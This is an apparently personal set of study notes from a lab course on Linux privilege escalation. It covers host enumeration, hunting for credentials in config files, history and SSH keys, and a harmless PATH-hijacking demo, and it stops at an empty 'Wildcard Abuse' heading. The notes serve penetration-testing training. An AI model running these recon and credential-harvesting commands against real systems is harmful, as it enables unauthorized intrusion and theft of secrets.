
# Table of Contents

1.  [Enumeration](#org68b7afa)
    1.  [**OS Version**](#org3bc4ad9)
    2.  [**Kernel Version**](#org3924b41)
    3.  [**Running Services**](#org96e6360)
    4.  [**Installed Packages and Versions**](#org322e56d)
    5.  [**Logged in Users**](#orgafc9ad1)
    6.  [**User Home Directories**](#org3d043c9)
    7.  [Other important location are](#org8b141bc)
    8.  [**Sudo Privileges**](#orgaca19e3)
    9.  [**Configuration Files**](#org4a8493e)
    10. [**Readable Shadow File**](#org50ec8d0)
    11. [**Password Hashes in /etc/passwd**](#orgc2b2635)
    12. [**Cron Jobs**](#orgb49dfc0)
    13. [**Unmounted File Systems and Additional Drives**](#orgce63ac0)
    14. [**SETUID and SETGID Permissions**](#orge64ce8a)
    15. [**Writeable Directories**](#org1da73c5)
    16. [**Writeable Files**](#orgaa80bf8)
2.  [Information Gathering](#org24d1257)
    1.  [Environment Enumeration](#orgcf1a027)
    2.  [Linux Services & Internals Enumeration](#org48a59ea)
        1.  [Internal](#org40fe653)
        2.  [Services](#org025b189)
    3.  [Credentials Hunting](#org33d6e1b)
        1.  [SSH Keys](#orge837cff)
3.  [Environment-based Privilege Escalation](#orgfe8f8ee)
    1.  [Path Abuse](#org6d2022e)
    2.  [Wildcard Abuse](#org15d85a8)
    3.  [Escaping Restricted Shell](#orge65b171)
4.  [Permissions-based Privilege Escalation](#org11b5dd7)
    1.  [Special Permisions](#org028595a)
        1.  [`setuid`](#org7e850c5)
        2.  [`setgiu`](#org5ef7a5c)
    2.  [Sudo Rights Abuse](#org62b20ef)
        1.  [Mitigations](#org7e0f660)
    3.  [Privileged Groups](#org8048c5b)
        1.  [LXC/LXD](#org6ddefc3)
        2.  [Docker](#org9a17bae)
        3.  [Disk](#orgc2cae37)
        4.  [ADM](#org0d00eaf)
    4.  [Capabilities](#org0f6d043)
        1.  [Set Capability](#org85464aa)
        2.  [Enumerating Capabilities](#orga5208a4)
5.  [Service-based Privilege Escalation](#orgeca8b6f)
    1.  [Vulnerable Services](#orge276c0c)
    2.  [Cron Job Abuse](#org2f27867)
    3.  [LXD](#org66fcd6b)
    4.  [Docker](#orga5a050d)
        1.  [Docker Shared Directories](#org78709ed)
        2.  [Docker Socket](#orgb6b85be)
        3.  [Writable Socket](#orgce39049)
    5.  [Kubernetes](#orgb04cc47)
        1.  [K8s Concept](#org324a5e2)
        2.  [Different between K8 and Docker](#org0c9775a)
        3.  [Architecture](#org8b73081)
        4.  [K8's Security Measures](#org857b77d)
        5.  [Kubernetes API](#org206d41e)
        6.  [Authentication](#orga533607)
        7.  [K8's API Server Interaction](#orgd2e9406)
        8.  [Kubelet API - Extracting Pods](#orgaace85a)
        9.  [Kubeletctl - Extracting Pods](#org38b5f90)
        10. [Kubelet API - Available Commands](#orgff9aaca)
        11. [Kubelet API - Executing Commands](#org1827051)
        12. [Privilage Escalation](#org38020a0)
    6.  [Logrotate](#org82c940d)
    7.  [Miscellaneous Techniques](#orgc946fb3)
        1.  [Passive Traffic Capture](#orga280ae2)
        2.  [Weak NFS Privileges](#org209c616)
        3.  [Hijacking Tmux Sessions](#orga48e5b8)
6.  [Linux Internals-based Privilege Escalation](#orga12b656)
    1.  [Kernel Exploits](#org76209a0)
    2.  [Shared Library](#org45a9013)
    3.  [Shared Object Hijacking](#orgd292677)
    4.  [Python Library Hijacking](#org8009ae4)
        1.  [Wrong Write Permission](#orgde5177f)
        2.  [Library Path](#org319cf57)
        3.  [PYTHONPATH Environment Variable](#org602661a)
7.  [Recent 0-Days <1 oct 2023>](#org44194a1)
    1.  [Sudo](#org9e8d217)
        1.  [Sudo Policy Bypass](#orgd9e46c1)
    2.  [Polkit](#orgd6ab618)
    3.  [Dirty Pipe](#org3556054)
    4.  [Netfilter](#org3e301d2)
        1.  [CVE-2021-22555](#org27469d7)
        2.  [CVE-2022-25636](#org957550a)
        3.  [CVE-2023-32233](#org3579acb)
8.  [Hardening Considerations](#orgfc25581)



<a id="org68b7afa"></a>

# Enumeration

Enumeration is the key to privilege escalation. 
When you gain initial shell access to the host, it is important to check several key details.


<a id="org3bc4ad9"></a>

## **OS Version**

Knowing the distribution (Ubuntu, Debian, FreeBSD, Fedora, SUSE, Red Hat, CentOS, etc.) will give you an idea of the types of tools that may be available. This would also identify the operating system version, for which there may be public exploits available.


<a id="org3924b41"></a>

## **Kernel Version**

As with the OS version, there may be public exploits that target a vulnerability in a specific kernel version. Kernel exploits can cause system instability or even a complete crash. Be careful running these against any production system, and make sure you fully understand the exploit and possible ramifications before running one.


<a id="org96e6360"></a>

## **Running Services**

Knowing what services are running on the host is important, especially those running as root. A misconfigured or vulnerable service running as root can be an easy win for privilege escalation. Flaws have been discovered in many common services such as Nagios, Exim, Samba, ProFTPd, etc. Public exploit PoCs exist for many of them, such as CVE\*\*2016\*\*9566, a local privilege escalation flaw in Nagios Core < 4.2.4.

    ps aux | grep root


<a id="org322e56d"></a>

## **Installed Packages and Versions**

it is important to check for any out\*\*of\*\*date or vulnerable packages that may be easily leveraged for privilege escalation. 


<a id="orgafc9ad1"></a>

## **Logged in Users**

Knowing which other users are logged into the system and what they are doing can give greater into possible local lateral movement and privilege escalation paths.

    ps au


<a id="org3d043c9"></a>

## **User Home Directories**

User home folders may also contain SSH keys that can be used to access other systems or scripts and configuration files containing credentials.


<a id="org8b141bc"></a>

## Other important location are

    ls /home # Home Directory Contents
    ls -la /home/<user>/ # User's Home Directory Contents
    ls -l ~/.ssh # SSH Directory Contents
    history # Bash history 


<a id="orgaca19e3"></a>

## **Sudo Privileges**

However, often **sudoer** entries include **NOPASSWD**, meaning that the user can run the specified command without being prompted for a password. Not all commands, even we can run as root, will lead to privilege escalation.

    sudo -l
    
    Matching Defaults entries for sysadm on NIX02:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User sysadm may run the following commands on NIX02:
        (root) NOPASSWD: /usr/sbin/tcpdump


<a id="org4a8493e"></a>

## **Configuration Files**

Configuration files can hold a wealth of information. It is worth searching through all files that end in extensions such as .conf and .config, for usernames, passwords, and other secrets.


<a id="org50ec8d0"></a>

## **Readable Shadow File**

If the shadow file is readable, you will be able to gather password hashes for all users who have a password set. While this does not guarantee further access, these hashes can be subjected to an offline brute\*\*force attack to recover the cleartext password.


<a id="orgc2b2635"></a>

## **Password Hashes in /etc/passwd**

Occasionally, you will see password hashes directly in the /etc/passwd file. This file is readable by all users, and as with hashes in the shadow file, these can be subjected to an offline password cracking attack. This configuration, while not common, can sometimes be seen on embedded devices and routers.

    cat /etc/passwd


<a id="orgb49dfc0"></a>

## **Cron Jobs**

Cron jobs on Linux systems are similar to Windows scheduled tasks. They are often set up to perform maintenance and backup tasks. In conjunction with other misconfigurations such as relative paths or weak permissions, they can leverage to escalate privileges when the scheduled cron job runs.

    ls -la /etc/cron.daily/


<a id="orgce63ac0"></a>

## **Unmounted File Systems and Additional Drives**

If you discover and can mount an additional drive or unmounted file system, you may find sensitive files, passwords, or backups that can be leveraged to escalate privileges.

    lsblk
    
    NAME                      MAJ:MIN RM  SIZE RO TYPE MOUNTPOINT
    loop0                       7:0    0   55M  1 loop /snap/core18/1705
    loop1                       7:1    0   69M  1 loop /snap/lxd/14804
    loop2                       7:2    0   47M  1 loop /snap/snapd/16292
    loop3                       7:3    0  103M  1 loop /snap/lxd/23339
    loop4                       7:4    0   62M  1 loop /snap/core20/1587
    loop5                       7:5    0 55.6M  1 loop /snap/core18/2538
    sda                         8:0    0   20G  0 disk 
    ├─sda1                      8:1    0    1M  0 part 
    ├─sda2                      8:2    0    1G  0 part /boot
    └─sda3                      8:3    0   19G  0 part 
    └─ubuntu--vg-ubuntu--lv 253:0    0   18G  0 lvm  /
    sr0                        11:0    1  908M  0 rom 


<a id="orge64ce8a"></a>

## **SETUID and SETGID Permissions**

Binaries are set with these permissions to allow a user to run a command as root, without having to grant root\*\*level access to the user. Many binaries contain functionality that can be exploited to get a root shell.


<a id="org1da73c5"></a>

## **Writeable Directories**

It is important to discover which directories are writeable if you need to download tools to the system. You may discover a writeable directory where a cron job places files, which provides an idea of how often the cron job runs and could be used to elevate privileges if the script that the cron job runs is also writeable.

    find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null


<a id="orgaa80bf8"></a>

## **Writeable Files**

Are any scripts or configuration files world-writable? While altering configuration files can be extremely destructive, there may be instances where a minor modification can open up further access. Also, any scripts that are run as root using cron jobs can be modified slightly to append a command.

    find / -path /proc --prune --o --type f --perm --o+w 2>/dev/null


<a id="org24d1257"></a>

# Information Gathering


<a id="orgcf1a027"></a>

## Environment Enumeration

The first and most fundamental question to address is, "What operating system are we dealing with?" Different Linux distributions require distinct enumeration techniques. For example, if you find yourself on a CentOS or Red Hat Enterprise Linux host, your approach may vary compared to a Debian-based system like Ubuntu. Even more exotic systems like FreeBSD, Solaris, HP-UX, or IBM AIX will demand unique commands and tactics.

However, while the specific commands may differ, the principles behind enumeration remain consistent. In this module, we will begin with an Ubuntu target to cover general tactics and techniques. The goal is to develop a comprehensive and repeatable process that can be applied to any Linux

1.  Started with `basic enumeration`
    
        whoami # what user are we running as
        id # what groups does our user belong to?
        hostname #what is the server named. can we gather anything from the naming convention?
        ifconfig or ip -a #what subnet did we land in, does the host have additional NICs in other subnets?
        sudo -l #can our user run anything with sudo (as another user as root) without needing a password? This can sometimes be the easiest win and we can do  something like sudo su and drop right into a root shell.

2.  Cheking out what `operating system and version` wea are dealing with
    
        cat /etc/os-release
        
        NAME="Ubuntu"
        VERSION="20.04.4 LTS (Focal Fossa)" # <-- Version!
        ID=ubuntu
        ID_LIKE=debian
        PRETTY_NAME="Ubuntu 20.04.4 LTS"
        VERSION_ID="20.04"
        HOME_URL="https://www.ubuntu.com/"
        SUPPORT_URL="https://help.ubuntu.com/"
        BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
        PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
        VERSION_CODENAME=focal
        UBUNTU_CODENAME=focal

3.  Check out our current `user's PATH`
    which is where the Linux system looks every time a command is executed for any executables to match the name of
    what we type, i.e., id which on this system is located at /usr/bin/id.
    
        echo $PATH
        
        /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin

4.  Check out all `environment variables` that are set for our current user
    
        env
        
        SHELL=/bin/bash
        PWD=/home/htb-student
        LOGNAME=htb-student
        XDG_SESSION_TYPE=tty
        MOTD_SHOWN=pam
        HOME=/home/htb-student
        LANG=en_US.UTF-8

5.  `Kernel versio`
    
        uname -a
        
        Linux nixlpe02 5.4.0-122-generic #138-Ubuntu SMP Wed Jun 22 15:00:31 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux

6.  `CPU type/version`
    
        lscpu
        
        Architecture:                    x86_64
        CPU op-mode(s):                  32-bit, 64-bit
        Byte Order:                      Little Endian
        Address sizes:                   43 bits physical, 48 bits virtual
        CPU(s):                          2
        On-line CPU(s) list:             0,1
        Thread(s) per core:              1
        Core(s) per socket:              2
        Socket(s):                       1
        NUMA node(s):                    1
        Vendor ID:                       AuthenticAMD
        CPU family:                      23
        Model:                           49
        Model name:                      AMD EPYC 7302P 16-Core Processor
        Stepping:                        0
        CPU MHz:                         2994.375
        BogoMIPS:                        5988.75
        Hypervisor vendor:               VMware

7.  Chek `installed shell`
    
        cat /etc/shells
        
        # /etc/shells: valid login shells
        /bin/sh
        /bin/bash
        /usr/bin/bash
        /bin/rbash
        /usr/bin/rbash
        /bin/dash
        /usr/bin/dash
        /usr/bin/tmux
        /usr/bin/screen

8.  We should also check to see if any `defenses are in place` and we can enumerate any information about them. Some things to look for include:
    -   [Exec Shield](https://en.wikipedia.org/wiki/Exec_Shield)
    -   [iptables](https://linux.die.net/man/8/iptables)
    -   [AppArmor](https://apparmor.net/)
    -   [SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)
    -   [Fail2ban](https://github.com/fail2ban/fail2ban)
    -   [Snort](https://www.snort.org/faq/what-is-snort)
    -   [Uncomplicated Firewall](https://wiki.ubuntu.com/UncomplicatedFirewall)

9.  Check out the `Routing Table` by typing route or netstat -rn.
    
        route
        
        Kernel IP routing table
        Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
        default         _gateway        0.0.0.0         UG    0      0        0 ens192
        10.129.0.0      0.0.0.0         255.255.0.0     U     0      0        0 ens192

10. `Arp Table` to see what other hosts the target has been communicating with.
    
        arp -a
        
        _gateway (10.129.0.1) at 00:50:56:b9:b9:fc [ether] on ens192

11. `User`
    -   **All user**
        
            cat /etc/passwd
            
            root:x:0:0:root:/root:/bin/bash
            daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
            bin:x:2:2:bin:/bin:/usr/sbin/nologin
            sys:x:3:3:sys:/dev:/usr/sbin/nologin
            sync:x:4:65534:sync:/bin:/bin/sync
            games:x:5:60:games:/usr/games:/usr/sbin/nologin
            man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
            lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
            mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
            news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
            uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
            proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
            www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
            backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
            list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
            irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
            tcpdump:x:108:115::/nonexistent:/usr/sbin/nologin
            mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
            bjones:x:1001:1001::/home/bjones:/bin/sh
            administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh
            backupsvc:x:1003:1003::/home/backupsvc:/bin/sh
            cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
            logger:x:1005:1005::/home/logger:/bin/sh
            shared:x:1006:1006::/home/shared:/bin/sh
            stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash
            htb-student:x:1008:1008::/home/htb-student:/bin/bash
            <SNIP>
    
    -   **Deep search**
        Occasionally, we will see password hashes directly in the /etc/passwd file. This file is readable by all users,
        and as with hashes in the /etc/shadow file, these can be subjected to an offline password cracking attack. This
        configuration, while not common, can sometimes be seen on embedded devices and routers.
        
            cat /etc/passwd | cut -f1 -d:
            
            root
            daemon
            bin
            sys
            
            ...SNIP...
            
            mrb3n
            lxd
            bjones
            administrator.ilfreight
            backupsvc
            cliff.moore
            logger
            shared
            stacey.jenkins
            htb-student
    
    -   **Users have login shells**
        We'll also want to check which users have login shells. Once we see what shells are on the system, we can check
        each version for vulnerabilities. Because outdated versions, such as Bash version 4.1, are vulnerable to a
        shellshock exploit.
        
            grep "*sh$" /etc/passwd
            
            root:x:0:0:root:/root:/bin/bash
            mrb3n:x:1000:1000:mrb3n:/home/mrb3n:/bin/bash
            bjones:x:1001:1001::/home/bjones:/bin/sh
            administrator.ilfreight:x:1002:1002::/home/administrator.ilfreight:/bin/sh
            backupsvc:x:1003:1003::/home/backupsvc:/bin/sh
            cliff.moore:x:1004:1004::/home/cliff.moore:/bin/bash
            logger:x:1005:1005::/home/logger:/bin/sh
            shared:x:1006:1006::/home/shared:/bin/sh
            stacey.jenkins:x:1007:1007::/home/stacey.jenkins:/bin/bash
            htb-student:x:1008:1008::/home/htb-student:/bin/bash

12. `Existing Groups`
    The /etc/group file lists all of the groups on the system.
    
        cat /etc/group
        
        root:x:0:
        daemon:x:1:
        bin:x:2:
        sys:x:3:
        adm:x:4:syslog,htb-student
        tty:x:5:syslog
        disk:x:6:
        lp:x:7:
        mail:x:8:
        news:x:9:
        uucp:x:10:
        man:x:12:
        proxy:x:13:
        kmem:x:15:
        dialout:x:20:
        fax:x:21:
        voice:x:22:
        cdrom:x:24:htb-student
        floppy:x:25:
        tape:x:26:
        sudo:x:27:mrb3n,htb-student
        audio:x:29:pulse
        dip:x:30:htb-student
        www-data:x:33:
    
    We can then use the getent command to list members of any interesting groups
    
        getent group sudo
        
        sudo:x:27:mrb3n

13. Check all `User` with your home directory
    We do that for search interssetsing file maybe containing valnearble information 
    
        ls /home
        
        administrator.ilfreight  bjones       htb-student  mrb3n   stacey.jenkins
        backupsvc                cliff.moore  logger       shared

14. `Mounted File Systems`
    We have to check all file System
    
        df -h
        
        Filesystem      Size  Used Avail Use% Mounted on
        udev            1,9G     0  1,9G   0% /dev
        tmpfs           389M  1,8M  388M   1% /run
        /dev/sda5        20G  7,9G   11G  44% /
        tmpfs           1,9G     0  1,9G   0% /dev/shm
        tmpfs           5,0M  4,0K  5,0M   1% /run/lock
        tmpfs           1,9G     0  1,9G   0% /sys/fs/cgroup
        /dev/loop0      128K  128K     0 100% /snap/bare/5
        /dev/loop1       62M   62M     0 100% /snap/core20/1611
        /dev/loop2       92M   92M     0 100% /snap/gtk-common-themes/1535
        /dev/loop4       55M   55M     0 100% /snap/snap-store/558
        /dev/loop3      347M  347M     0 100% /snap/gnome-3-38-2004/115
        /dev/loop5       47M   47M     0 100% /snap/snapd/16292
        /dev/sda1       511M  4,0K  511M   1% /boot/efi
        tmpfs           389M   24K  389M   1% /run/user/1000
        /dev/sr0        3,6G  3,6G     0 100% /media/htb-student/Ubuntu 20.04.5 LTS amd64
        /dev/loop6       50M   50M     0 100% /snap/snapd/17576
        /dev/loop7       64M   64M     0 100% /snap/core20/1695
        /dev/loop8       46M   46M     0 100% /snap/snap-store/599
        /dev/loop9      347M  347M     0 100% /snap/gnome-3-38-2004/119

15. `Unmounted File System`
    When a file system is unmounted, it is no longer accessible by the system.
    Therefore, if we can extend our privileges to the root user, we could mount and read these file systems
    ourselves. Unmounted file systems can be viewed as follows:
    
        cat /etc/fstab | grep -v "#" | column -t
        
        UUID=5bf16727-fcdf-4205-906c-0620aa4a058f  /          ext4  errors=remount-ro  0  1
        UUID=BE56-AAE0                             /boot/efi  vfat  umask=0077         0  1
        /swapfile                                  none       swap  sw                 0  0

16. `All Hidden Artifacts`
    Many folders and files are kept hidden on a Linux system so they are not obvious, and accidental editing is
    prevented. Why such files and folders are kept hidden, there are many more reasons than those mentioned so far.
    Nevertheless, we need to be able to locate all hidden files and folders because they can often contain sensitive
    information, even if we have read-only permissions.
    -   All Hidden `Files`
        
            find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep <User>
            
            -rw-r--r-- 1 htb-student htb-student 3771 Nov 27 11:16 /home/htb-student/.bashrc
            -rw-rw-r-- 1 htb-student htb-student 180 Nov 27 11:36 /home/htb-student/.wget-hsts
            -rw------- 1 htb-student htb-student 387 Nov 27 14:02 /home/htb-student/.bash_history
            -rw-r--r-- 1 htb-student htb-student 807 Nov 27 11:16 /home/htb-student/.profile
            -rw-r--r-- 1 htb-student htb-student 0 Nov 27 11:31 /home/htb-student/.sudo_as_admin_successful
            -rw-r--r-- 1 htb-student htb-student 220 Nov 27 11:16 /home/htb-student/.bash_logout
            -rw-rw-r-- 1 htb-student htb-student 162 Nov 28 13:26 /home/htb-student/.notes
    
    -   All Hidden `Directory`
        
            find / -type d -name ".*" -ls 2>/dev/null
            
            
               684822      4 drwx------   3 htb-student htb-student     4096 Nov 28 12:32 /home/htb-student/.gnupg
               790793      4 drwx------   2 htb-student htb-student     4096 Okt 27 11:31 /home/htb-student/.ssh
               684804      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.cache
               790827      4 drwxrwxr-x   8 htb-student htb-student     4096 Okt 27 11:32 /home/htb-student/CVE-2021-3156/.git
               684796      4 drwx------  10 htb-student htb-student     4096 Okt 27 11:30 /home/htb-student/.config
               655426      4 drwxr-xr-x   3 htb-student htb-student     4096 Okt 27 11:19 /home/htb-student/.local
               524808      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.cache
               544027      4 drwxr-xr-x   7 gdm         gdm             4096 Okt 27 11:19 /var/lib/gdm3/.config
               544028      4 drwxr-xr-x   3 gdm         gdm             4096 Aug 31 08:54 /var/lib/gdm3/.local
               524938      4 drwx------   2 colord      colord          4096 Okt 27 11:19 /var/lib/colord/.cache
                 1408      2 dr-xr-xr-x   1 htb-student htb-student     2048 Aug 31 09:17 /media/htb-student/Ubuntu\ 20.04.5\ LTS\ amd64/.disk
               280101      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.font-unix
               262364      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.ICE-unix
               262362      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:32 /tmp/.X11-unix
               280103      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.Test-unix
               262830      4 drwxrwxrwt   2 root        root            4096 Nov 28 12:31 /tmp/.XIM-unix
               661820      4 drwxr-xr-x   5 root        root            4096 Aug 31 08:55 /usr/lib/modules/5.15.0-46-generic/vdso/.build-id
               666709      4 drwxr-xr-x   5 root        root            4096 Okt 27 11:18 /usr/lib/modules/5.15.0-52-generic/vdso/.build-id
               657527      4 drwxr-xr-x 170 root        root            4096 Aug 31 08:55 /usr/lib/debug/.build-id

17. `Temporary File`
    Both **/tmp** and **/var/tmp** are used to store data temporarily. However, the key difference is how long the data is
    stored in these file systems. The data retention time for /var/tmp is much longer than that of the /tmp directory.
    
        ls -l /tmp /var/tmp /dev/shm
        
        /dev/shm:
        total 0
        
        /tmp:
        total 52
        -rw------- 1 htb-student htb-student    0 Nov 28 12:32 config-err-v8LfEU
        drwx------ 3 root        root        4096 Nov 28 12:37 snap.snap-store
        drwx------ 2 htb-student htb-student 4096 Nov 28 12:32 ssh-OKlLKjlc98xh
        <SNIP>
        drwx------ 2 htb-student htb-student 4096 Nov 28 12:37 tracker-extract-files.1000
        drwx------ 2 gdm         gdm         4096 Nov 28 12:31 tracker-extract-files.125
        
        /var/tmp:
        total 28
        drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-colord.service-RrPcyi
        drwx------ 3 root root 4096 Nov 28 12:31 systemd-private-7b455e62ec09484b87eff41023c4ca53-ModemManager.service-4Rej9e

18. `Search text` into all file in file system
    
        * grep -r -l 'HTB{[^}]*}' / 2>/dev/null
        
        * grep -r -l 'HTB{' / 2>/dev/null
        
        find / -type f -print0 | grep -r -l ‘HTB{[^}]*}’ / 2>/dev/null
        
        grep -EoR "HTB\{.*\}" / 2>/dev/null


<a id="org48a59ea"></a>

## Linux Services & Internals Enumeration


<a id="org40fe653"></a>

### Internal

At this time we'll also want to gather as much network information as possible.
When we talk about the `internals`, we mean the internal configuration and way of working, including integrated processes designed to accomplish specific tasks.

1.  `Network Interfaces`
    
        ip a

2.  `Hosts`
    
        cat /etc/hosts

3.  `User's Last Login`
    
        lastlog

4.  `Logged In Users`
    
        w

5.  `Command history`
    
        history

6.  `Finding History Files`
    Sometimes we can also find special history files created by scripts or programs. This can be found, among others,
    in scripts that monitor certain activities of users and check for suspicious activities.
    
        find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null

7.  `Cron`
    
        ls -la /etc/cron.daily/

8.  `Proc`
    The **proc filesystem** (`proc` / `procfs`) is a particular filesystem in Linux that contains information about system
    processes, hardware, and other system information. It is the primary way to access process information and can be
    used to view and modify kernel settings. It is virtual and does not exist as a real filesystem but is dynamically
    generated by the kernel. It can be used to look up system information such as the state of running processes,
    kernel parameters, system memory, and devices. It also sets certain system parameters, such as process priority,
    scheduling, and memory allocation.
    
        find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"


<a id="org025b189"></a>

### Services

If it is a slightly older Linux system, the likelihood increases that we can find installed packages that may already have at least one vulnerability. However, current versions of Linux distributions can also have older packages or software installed that may have such vulnerabilities. Therefore, we will see a method to help us detect potentially dangerous packages in a bit. To do this, we first need to create a list of installed packages to work with.

1.  `Installed Packages`
    
        apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list

2.  `Sudo Version`
    
        sudo -V

3.  `Binaries`
    
        ls -l /bin /usr/bin/ /usr/sbin/

4.  `GTOFbins`
    the [GTOFbins](https://gtfobins.github.io/) provides an excellent platform that includes a list of binaries that can potentially be exploited to
    escalate our privileges on the target system. With the next oneliner, we can compare the existing binaries with
    the ones from GTFObins to see which binaries we should investigate later.
    
        for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done

5.  `Strace tool (sys call)`
    We can use the diagnostic tool strace on Linux-based operating systems to track and analyze system calls and
    signal processing. It allows us to follow the flow of a program and understand how it accesses system resources,
    processes signals, and receives and sends data from the operating system. In addition, we can also use the tool to
    monitor security-related activities and identify potential attack vectors, such as specific requests to remote
    hosts using passwords or tokens.
    
    The output of strace can be written to a file for later analysis, and it provides a wealth of options that allow
    detailed monitoring of the program's behavior.
    
        strace ping -c1 10.129.112.20

6.  `Configuration Files`
    Users can read almost all configuration files on a Linux operating system if the administrator has kept them the
    same. These configuration files can often reveal how the service is set up and configured to understand better how
    we can use it for our purposes.
    
        find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null

7.  Search `scripts`
    
        find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

8.  Running `Services` by `User`
    Also, if we look at the process list, it can give us information about which scripts or binaries are in use and by
    which user. So, for example, if it is a script created by the administrator in his path and whose rights have not
    been restricted, we can run it without going into the root directory.
    
        ps aux | grep <user>

9.  Find `version of a Softwer`
    For exemple Python
    
        whereis python3
        ls -ls /usr/bin/python*
        compgen -c python | grep -P '^python\d'
        find /usr/bin/python* ! -type l


<a id="org33d6e1b"></a>

## Credentials Hunting

When enumerating a system, it is important to note down any credentials. These may be found in configuration files (.conf, .config, .xml, etc.), shell scripts, a user's bash history file, backup (.bak) files, within database files or even in text files. Credentials may be useful for escalating to other users or even root, accessing databases and other systems within the environment.

The /var directory typically contains the web root for whatever web server is running on the host. The web root may contain database credentials or other types of credentials that can be leveraged to further access. A common example is MySQL database credentials within WordPress configuration files:

    cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
    
    define( 'DB_USER', 'wordpressuser' );
    define( 'DB_PASSWORD', 'WPadmin123!' );

The spool or mail directories, if accessible, may also contain valuable information or even credentials. It is common to find credentials stored in files in the web root (i.e. MySQL connection strings, WordPress configuration files).

    find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
    
    /etc/ssh/ssh_config
    /etc/ssh/sshd_config
    /etc/python3/debian_config
    /etc/kbd/config
    /etc/manpath.config
    /boot/config-4.4.0-116-generic
    /boot/grub/i386-pc/configfile.mod
    /sys/devices/pci0000:00/0000:00:00.0/config
    /sys/devices/pci0000:00/0000:00:01.0/config

    grep -ri password


<a id="orge837cff"></a>

### SSH Keys

It is also useful to search around the system for accessible SSH private keys. We may locate a private key for another, more privileged, user that we can use to connect back to the box with additional privileges. We may also sometimes find SSH keys that can be used to access other hosts in the environment. Whenever finding SSH keys check the known<sub>hosts</sub> file to find targets. This file contains a list of public keys for all the hosts which the user has connected to in the past and may be useful for lateral movement or to find data on a remote host that can be used to perform privilege escalation on our target.

    ls ~/.ssh
    
    id_rsa  id_rsa.pub  known_hosts


<a id="orgfe8f8ee"></a>

# Environment-based Privilege Escalation


<a id="org6d2022e"></a>

## Path Abuse

[PATH](http://www.linfo.org/path_env_var.html) is an environment variable that specifies the set of directories where an executable can be located. An account's PATH variable is a set of absolute paths, allowing a user to type a command without specifying the absolute path to the binary. For example, a user can type `cat /tmp/test.txt` instead of specifying the absolute path `/bin/cat` `/tmp/test.txt`. We can check the contents of the PATH variable by typing `env | grep PATH` or `echo $PATH`.

    echo $PATH
    
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

Creating a script or program in a directory specified in the PATH will make it executable from any directory on the system.

    pwd && conncheck 

As shown below, `the conncheck` script created in `/usr/local/sbin` will still run when in the `/tmp` directory because it was created in a directory specified in the PATH.

    pwd && conncheck 
    
    /tmp
    Active Internet connections (servers and established)
    Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
    tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      1189/sshd       
    tcp        0    268 10.129.2.12:22          10.10.14.3:43218        ESTABLISHED 1614/sshd: mrb3n [p
    tcp6       0      0 :::22                   :::*                    LISTEN      1189/sshd       
    tcp6       0      0 :::80                   :::*                    LISTEN      1304/apache2   

Adding `.` to a user's PATH adds their current working directory to the list. For example, if we can modify a user's path, we could replace a common binary such as `ls` with a malicious script such as a reverse shell. If we add . to the path by issuing the command `PATH=.:$PATH` and then `export PATH`, we will be able to run binaries located in our current working directory by just typing the name of the file (i.e. just typing `ls` will call the malicious script named `ls` in the current working directory instead of the binary located at `/bin/ls`).

    echo $PATH
    
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
    
    PATH=.:${PATH}
    export PATH
    echo $PATH
    
    .:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games

In this example, we modify the path to run a simple `echo` command when the command `ls` is typed.

    touch ls
    echo 'echo "PATH ABUSE!!"' > ls
    chmod +x ls
    
    ls
    
    PATH ABUSE!!


<a id="org15d85a8"></a>

## Wildcard Abuse

